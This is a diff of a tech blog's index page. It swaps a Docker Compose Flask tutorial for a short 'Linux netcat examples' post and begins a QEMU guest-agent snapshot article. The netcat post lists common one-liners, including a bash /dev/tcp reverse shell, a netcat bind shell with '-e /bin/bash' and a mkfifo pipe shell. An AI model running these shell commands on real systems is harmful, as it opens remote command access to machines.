@@ -383,8 +383,8 @@
             
               
                 
-                <a class="post-title-link" href="/2015/02/11/how-to-use-docker-compose-to-deploy-a-flask-app/" itemprop="url">
-                  How to use docker compose to deploy a flask app
+                <a class="post-title-link" href="/2015/02/11/linux-netcat-examples/" itemprop="url">
+                  Linux netcat examples
                 </a>
               
             
@@ -403,32 +403,13 @@
           </span>
 
           
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Docker/" itemprop="url" rel="index">
-                    <span itemprop="name">Docker</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
 
           
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2015/02/11/how-to-use-docker-compose-to-deploy-a-flask-app/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/02/11/how-to-use-docker-compose-to-deploy-a-flask-app/" itemprop="commentsCount"></span>
+                <a href="/2015/02/11/linux-netcat-examples/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/02/11/linux-netcat-examples/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -453,229 +434,23 @@
       
         
           
-            <p>The flask app is very simple, you have an index page where your can write and read comments.</p>
-<h2 id="To-start"><a href="#To-start" class="headerlink" title="To start"></a>To start</h2><p>So what we need ?</p>
-<p>In my case a <a href="https://www.digitalocean.com/?refcode=16e2312f412e" title="Digital Ocean" target="_blank" rel="external">Digital Ocean</a> droplet (I’m using Fedora 21).</p>
-<p>So, first of all we connect to our vm with ssh.</p>
-<pre class="code literal-block">
-<span class="nv">$ </span>ssh root@yourvmip
-</pre>
-
-<p>Now that we are inside we need to install git, Docker and docker-compose.</p>
-<pre class="code literal-block">
-<span class="nv">$ </span>yum -y install git docker python-pip
-<span class="nv">$ </span>pip install docker-compose<span class="o">==</span>1.1.0-rc2
-<span class="nv">$ </span>systemctl start docker
-<span class="nv">$ </span>systemctl <span class="nb">enable </span>docker
-</pre>
-
-<p>That’s all we need to play with Docker.</p>
-<p>This is our directory tree of our project, quietly standard as you can see.</p>
-<pre class="code literal-block">
-yourappdir/
-    - nginx/
-        - static/
-            - put your static file here
-        - sites-enabled/
-            - app
-        - Dockerfile
-    - templates/
-        - index.html
-    - .gitignore
-    - app.py
-    - build.yml
-    - Dockerfile
-    - README
-    - requirements.txt
-</pre>
-
-<p>So let’s start to analyze every part, app, nginx, Dockerfiles and build.yml.</p>
-<p>The remaining files, .gitignore, README and requirements.txt are pretty standard and I think there’s not to much to say.</p>
-<p><a href="https://github.com/barrachri/flask_docker" title="flask_docker Repository" target="_blank" rel="external">Here</a> you can find the repo of this project.</p>
-<h2 id="App"><a href="#App" class="headerlink" title="App"></a>App</h2><p>If you don’t know <a href="http://flask.pocoo.org/" title="Flask" target="_blank" rel="external">Flask</a> it’s the right time to spend some hours to learn it, simple and powerful !</p>
-<p>That’s our app, we have some imports, one line config, our models and views.</p>
-<pre class="code literal-block">
-<span class="c">\## yourdirapp/app.py ##</span><span class="c">\## import ##</span>
-<span class="kn">import</span> <span class="nn">datetime</span>
-<span class="kn">from</span> <span class="nn">flask</span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">g</span>
-<span class="kn">from</span> <span class="nn">peewee</span> <span class="kn">import</span> <span class="n">PostgresqlDatabase</span><span class="p">,</span><span class="n">Model</span><span class="p">,</span><span class="n">CharField</span><span class="p">,</span> <span class="n">TextField</span><span class="p">,</span> <span class="n">DateTimeField</span><span class="p">,</span> <span class="n">OperationalError</span><span class="p">,</span> <span class="n">ProgrammingError</span>
-
-<span class="c">\## config ##</span>
-<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>
-
-<span class="c">\## models ##</span>
-<span class="n">user</span> <span class="o">=</span> <span class="s">'postgres'</span>
-<span class="n">host</span> <span class="o">=</span> <span class="s">'postgres'</span>
-<span class="n">database</span> <span class="o">=</span> <span class="s">'postgres'</span>
-<span class="n">psql_db</span> <span class="o">=</span> <span class="n">PostgresqlDatabase</span><span class="p">(</span><span class="n">database</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">)</span>
-
-<span class="k">class</span> <span class="nc">Comment</span><span class="p">(</span><span class="n">Model</span><span class="p">):</span>
-    <span class="n">title</span> <span class="o">=</span> <span class="n">CharField</span><span class="p">()</span>
-    <span class="n">body</span> <span class="o">=</span> <span class="n">TextField</span><span class="p">()</span>
-    <span class="n">date</span> <span class="o">=</span> <span class="n">DateTimeField</span><span class="p">()</span>
-    <span class="n">author</span> <span class="o">=</span> <span class="n">CharField</span><span class="p">()</span>
-    <span class="k">class</span> <span class="nc">Meta</span><span class="p">:</span>
-        <span class="n">database</span> <span class="o">=</span> <span class="n">psql_db</span>
-
-<span class="k">try</span><span class="p">:</span>
-    <span class="n">Comment</span><span class="o">.</span><span class="n">create_table</span><span class="p">()</span>
-<span class="k">except</span> <span class="p">(</span><span class="n">OperationalError</span><span class="p">,</span> <span class="n">ProgrammingError</span><span class="p">):</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"Comment table already exists!"</span><span class="p">)</span>
-
-<span class="c">\## views ##</span>
-<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
-<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">from_object</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
-
-<span class="nd">@app.before_request</span>
-<span class="k">def</span> <span class="nf">before_request</span><span class="p">():</span>
-    <span class="n">g</span><span class="o">.</span><span class="n">db</span> <span class="o">=</span> <span class="n">psql_db</span>
-    <span class="n">g</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
-
-<span class="nd">@app.after_request</span>
-<span class="k">def</span> <span class="nf">after_request</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
-    <span class="n">g</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-    <span class="k">return</span> <span class="n">response</span>
-
-<span class="nd">@app.route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span><span class="s">'POST'</span><span class="p">])</span>
-<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
-    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
-        <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">'title'</span><span class="p">]</span>
-        <span class="n">author</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">'author'</span><span class="p">]</span>
-        <span class="n">body</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">'text'</span><span class="p">]</span>
-        <span class="n">comment</span> <span class="o">=</span> <span class="n">Comment</span><span class="o">.</span><span class="n">create</span><span class="p">(</span>
-            <span class="n">title</span><span class="o">=</span><span class="n">title</span><span class="p">,</span>
-            <span class="n">body</span><span class="o">=</span><span class="n">body</span><span class="p">,</span>
-            <span class="n">author</span><span class="o">=</span><span class="n">author</span><span class="p">,</span>
-            <span class="n">date</span><span class="o">=</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span>
-        <span class="n">comment</span><span class="o">.</span><span class="n">save</span><span class="p">()</span>
-    <span class="n">comments</span> <span class="o">=</span> <span class="n">Comment</span><span class="o">.</span><span class="n">select</span><span class="p">()</span><span class="o">.</span><span class="n">order_by</span><span class="p">(</span><span class="n">Comment</span><span class="o">.</span><span class="n">date</span><span class="o">.</span><span class="n">desc</span><span class="p">())</span>
-    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'index.html'</span><span class="p">,</span> <span class="n">comments</span><span class="o">=</span><span class="n">comments</span><span class="p">)</span>
-
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
-    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
-</pre>
-
-<p>Simple right ?</p>
-<p>We use <a href="http://docs.peewee-orm.com/en/latest/" title="Peewee" target="_blank" rel="external">Peewee</a> as ORM.</p>
-<p>And here is the index.html template, based on jinja2</p>
-<figure class="highlight django"><table><tr><td class="code"><pre><div class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">class</span>=<span class="string">"no-js"</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></div><div class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flask app<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/static/css/foundation.css"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/static/js/vendor/modernizr.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"large-12 columns"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to Flask<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"large-8 medium-8 columns"</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!-- Grid Example --&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">h5</span>&gt;</span>Write something !<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"."</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></div><div class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"large-12 columns"</span>&gt;</span></div><div class="line">                      <span class="tag">&lt;<span class="name">label</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line">                      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"title"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"Insert comment title"</span> /&gt;</span></div><div class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"large-4 medium-4 columns"</span>&gt;</span></div><div class="line">                      <span class="tag">&lt;<span class="name">label</span>&gt;</span>Author<span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line">                      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"Your name"</span> /&gt;</span></div><div class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"large-12 columns"</span>&gt;</span></div><div class="line">                      <span class="tag">&lt;<span class="name">label</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line">                      <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"Comment body"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></div><div class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">                  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"large-8 medium-8 columns"</span>&gt;</span></div><div class="line">    <span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> comment <span class="keyword">in</span> comments %&#125;</span><span class="xml"></span></div><div class="line">       <span class="tag">&lt;<span class="name">hr</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span><span class="template-variable">&#123;&#123;comment.id&#125;&#125;</span><span class="xml"> - </span><span class="template-variable">&#123;&#123;comment.title&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></div><div class="line">        <span class="tag">&lt;<span class="name">h5</span>&gt;</span><span class="template-variable">&#123;&#123;comment.author&#125;&#125;</span><span class="xml"> - </span><span class="template-variable">&#123;&#123;comment.date&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span></div><div class="line">        <span class="comment">&lt;!-- Grid Example --&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"large-12 columns"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"callout panel"</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="template-variable">&#123;&#123;comment.body&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></div><div class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"> <span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="xml"></span></div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/static/js/vendor/jquery.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/static/js/foundation.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">      $(<span class="built_in">document</span>).foundation();</div><div class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>With flask we are done.</p>
-<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>We use nginx as proxy, to redirect some request to our python app and to serve our static files.</p>
-<p>That’s our sites-enabled conf</p>
-<pre class="code literal-block">
-<span class="c1">\# yourappdir/nginx/sites-enabled/app</span>
-<span class="k">server</span><span class="p">{</span>
-    <span class="kn">listen</span><span class="mi">80</span><span class="p">;</span>
-    <span class="kn">server_name</span> <span class="s">yourwebsite.com</span><span class="p">;</span>
-    <span class="kn">charset</span>     <span class="s">utf-8</span><span class="p">;</span>
-    <span class="kn">location</span> <span class="s">/static</span> <span class="p">{</span>
-        <span class="kn">alias</span> <span class="s">/www/static</span><span class="p">;</span> <span class="c1">\# your project's static files</span>
-        <span class="p">}</span>
-    <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
-        <span class="kn">proxy_pass</span> <span class="s">http://python:8000</span><span class="p">;</span>
-        <span class="kn">proxy_set_header</span> <span class="s">Host</span> <span class="nv">$host</span><span class="p">;</span>
-        <span class="kn">proxy_set_header</span> <span class="s">X-Real-IP</span> <span class="nv">$remote_addr</span><span class="p">;</span>
-        <span class="kn">proxy_set_header</span> <span class="s">X-Forwarded-For</span> <span class="nv">$proxy_add_x_forwarded_for</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-</pre>
-
-<p>The only thing that can looks strange is “proxy_pass <a href="http://python:8000" target="_blank" rel="external">http://python:8000</a>“, when we link a container to another container Docker insert a new line inside linked container<br>/etc/hosts, something like “172.0.0.x python”.</p>
-<p>This is how our nginx container know our python app ip.</p>
-<h2 id="Docker-and-docker-compose-file"><a href="#Docker-and-docker-compose-file" class="headerlink" title="Docker and docker-compose file"></a>Docker and docker-compose file</h2><p>And now it’s the time to talk about Docker and docker-compose.</p>
-<p>This is our one line Dockerfile used to build python app container.</p>
-<p>We use the power of <a href="https://docs.docker.com/reference/builder/#onbuild" title="ON BUILD" target="_blank" rel="external">ON BUILD</a> to install all requirements and copy the current directory inside the container /usr/src/app</p>
-<pre class="code literal-block">
-# yourappdir/Dockerfile
-FROM python:3.4.2-onbuild
-</pre>
-
-<p>This is Dockerfile for nginx container</p>
-<pre class="code literal-block">
-# yourappdir/nginx/Dockerfile
-FROM tutum/nginx
-RUN rm /etc/nginx/sites-enabled/default
-ADD sites-enabled/ /etc/nginx/sites-enabled
-ADD static/ /www/static
-</pre>
-
-<p>For postgres we use the official image available on Docker registry.</p>
-<p>Now it’s the time for docker-compose.</p>
-<p>I think that docker-compose it’s a great tool that Docker didn’t have.</p>
-<p>Basically we have a <a href="https://github.com/docker/fig/blob/master/docs/cli.md" title="CLI" target="_blank" rel="external">CLI</a> and a <a href="https://github.com/docker/fig/blob/master/docs/yml.md" title="yml file" target="_blank" rel="external">yml file</a> that describes which containers you want to create and some options.</p>
-<p>If you have some experience with Docker you’ll see something familiar in some parameters.</p>
-<p>In our case we create 3 containers, python, nginx and postgres</p>
-<p>The first line (python, nginx and postgres) are just alias for the containers</p>
-<pre class="code literal-block">
-<span class="c1">\######################</span><span class="c1">\## PYTHON CONTAINER ##</span>
-<span class="c1">\######################</span>
-<span class="l-Scalar-Plain">python</span><span class="p-Indicator">:</span>
-    <span class="l-Scalar-Plain">restart</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">always</span>
-    <span class="l-Scalar-Plain">build</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">.</span>
-    <span class="l-Scalar-Plain">expose</span><span class="p-Indicator">:</span>
-        <span class="p-Indicator">-</span> <span class="s">"8000"</span>
-    <span class="l-Scalar-Plain">links</span><span class="p-Indicator">:</span>
-        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">postgres:postgres</span>
-    <span class="l-Scalar-Plain">volumes</span><span class="p-Indicator">:</span>
-        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">/usr/src/app</span>
-    <span class="l-Scalar-Plain">command</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/usr/local/bin/gunicorn -w 2 -b :8000 app:app</span>
-
-<span class="c1">\#####################</span>
-<span class="c1">\## NGINX CONTAINER ##</span>
-<span class="c1">\#####################</span>
-<span class="l-Scalar-Plain">nginx</span><span class="p-Indicator">:</span>
-    <span class="l-Scalar-Plain">restart</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">always</span>
-    <span class="l-Scalar-Plain">build</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">./nginx/</span>
-    <span class="l-Scalar-Plain">ports</span><span class="p-Indicator">:</span>
-        <span class="p-Indicator">-</span> <span class="s">"80:80"</span>
-    <span class="l-Scalar-Plain">volumes</span><span class="p-Indicator">:</span>
-        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">/www/static</span>
-    <span class="l-Scalar-Plain">links</span><span class="p-Indicator">:</span>
-        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">python:python</span>
-
-<span class="c1">\####################</span>
-<span class="c1">\## POSTGRES CONTAINER ##</span>
-<span class="c1">\####################</span>
-<span class="l-Scalar-Plain">postgres</span><span class="p-Indicator">:</span>
-    <span class="l-Scalar-Plain">restart</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">always</span>
-    <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">postgres</span>
-    <span class="l-Scalar-Plain">expose</span><span class="p-Indicator">:</span>
-        <span class="p-Indicator">-</span> <span class="s">"5432"</span>
-</pre>
-
-<p>Cool, that’s all !</p>
-<p>now we can type this command</p>
-<pre class="code literal-block">
-<span class="nv">$ </span>docker-compose --file build.yml up -d
-</pre>
-
-<p>And docker-compose will start to create and run our Docker containers.<br>First it tries to pull/build the image specified then it creates and runs the<br>Docker container with our parameters and the right order.</p>
-<p>In our example postgres will be created before the python container and nginx will be the last created container.</p>
-<p>How to check which containers are running ?</p>
-<pre class="code literal-block">
-<span class="nv">$ </span>docker-compose --file build.yml ps
-</pre>
-
-<p>And how to see the logs of containers ?</p>
-<pre class="code literal-block">
-<span class="nv">$ </span>docker-compose --file build.yml logs
-</pre>
-
-<h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><p>I would like to tell more about some “issues” that I’ve met.</p>
-<h4 id="Postgres-database"><a href="#Postgres-database" class="headerlink" title="Postgres database"></a>Postgres database</h4><p>It is fucki*ng hard to create a postgres database without using psql or connect directly to the database.<br>In my example database must exist before or at the same time that app was running, essentially because without the database you’ll get some errors.</p>
-<p>So I’ve tried to use pyscopg2 to check if the database exists or not and then create it, but without great results.</p>
-<p>The best solution probably is to create a new database during image creation, but in the official Postgres image this option is still not available.</p>
-<p>In my case I’ve used the default “postgres” db.</p>
-<h4 id="Image-and-container-rebuild"><a href="#Image-and-container-rebuild" class="headerlink" title="Image and container rebuild"></a>Image and container rebuild</h4><p>I think can be a good option to have the possibility to choice which containers recreate and which not and the same for the images.<br>For example I would like to have some data containers inside build.yml but it’s risky, because with <em>rm</em> you remove all containers inside your build.yml…</p>
-<pre class="code literal-block">
-<span class="nv">$docker</span>-compose --file build.yml rm
-<span class="c">\# SHIT MY DATABASE DATA ARE LOST !</span>
-</pre>
-
-<p>Of course you have “—no-recreate” option but is referred to existing containers.</p>
-<p>Now it’s time for my questions.</p>
-<p>Do I miss something ? Or maybe I could make something better ?</p>
-<p>I like to hear your experiences about how to handle Docker orchestration !</p>
+            <h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nc -z -v -n 172.31.100.7 21-25</p>
+<h3 id="Chat-Server"><a href="#Chat-Server" class="headerlink" title="Chat Server"></a>Chat Server</h3><p>Server: nc -l 1567</p>
+<p>Client: nc 172.31.100.7 1567</p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>Server to Client: </p>
+<p>Server: nc -l 1567 &lt; file.txt </p>
+<p>Client: nc -n 172.31.100.7 1567 &gt; file.txt</p>
+<p>Client to Server:</p>
+<p>Server: nc -l 1567 &gt; file.txt</p>
+<p>Client: nc 172.31.100.23 1567 &lt; file.txt</p>
+<h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>Server: tar -cvf - dir_name | nc -l 1567</p>
+<p>Client: nc -n 172.31.100.7 1567 | tar -xvf -</p>
+<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p>Server: cat video.avi | nc -l 1567</p>
+<p>Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -</p>
+<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>nc -l -p 8080 -vvv</p>
+<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
+<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>nc -l 1567 -e /bin/bash -i</p>
+<p>mkfifo /tmp/tmp_fifo &amp;&amp; cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</p>
 
           
         
@@ -3146,6 +2921,141 @@ ADD static/ /www/static
             
               
                 
+                <a class="post-title-link" href="/2015/02/09/perform-consistent-snapshots-with-qemu-guest-agent/" itemprop="url">
+                  Perform Consistent Snapshots with qemu guest agent
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2015-02-10T00:00:00+08:00" content="2015-02-10">
+              2015-02-10
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2015/02/09/perform-consistent-snapshots-with-qemu-guest-agent/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/02/09/perform-consistent-snapshots-with-qemu-guest-agent/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>A while back, I <a href="http://www.sebastien-han.fr/blog/2012/12/10/openstack-perform-consistent-snapshots/" target="_blank" rel="external">wrote an article</a> about taking consistent snapshots of your virtual machines in your OpenStack environment.<br>    However this method was really intrusive since it required to be inside the virtual machine and to manually summon a filesystem freeze.<br>    In this article, I will use a different approach to achieve the same goal without the need to be inside the virtual machine.</p>
+<p>The only requirement is to have a virtual machine running the qemu-guest-agent.</p>
+<h1 id="OpenStack-Nova-and-QEMU-guest-agent"><a href="#OpenStack-Nova-and-QEMU-guest-agent" class="headerlink" title="OpenStack Nova and QEMU guest agent"></a>OpenStack Nova and QEMU guest agent</h1><p>The QEMU guest support landed in Nova during the Havana cycle, so basically we are two release ahead.<br>This functionality is based on Glance properties.</p>
+<p>But how does that work?</p>
+<p>The principle is quite easy. A virtual machine boots with a new virtio device attached pointing to unix socket on the hypervisor. Inside the virtual machine this socket will appear as a new character device, commonly under <code>/dev/virtio-ports/</code>.</p>
+<p>A picture is always better:</p>
+<p><img src="/assets/qemu-agent-freeze-thaw.png" alt=""></p>
+<h1 id="Configure-the-QEMU-agent"><a href="#Configure-the-QEMU-agent" class="headerlink" title="Configure the QEMU agent"></a>Configure the QEMU agent</h1><p>For Ubuntu, you need to apply this fix since AppArmor will not allow the creation of the socket:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo <span class="built_in">echo</span> <span class="string">"/var/lib/libvirt/qemu/*.sock rw,"</span> | sudo tee <span class="_">-a</span> /etc/apparmor.d/abstractions/libvirt-qemu</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo service libvirt-bin restart</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo service nova-compute restart</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo service apparmor reload</span></div></pre></td></tr></table></figure>
+<p>Configure your Glance image:</p>
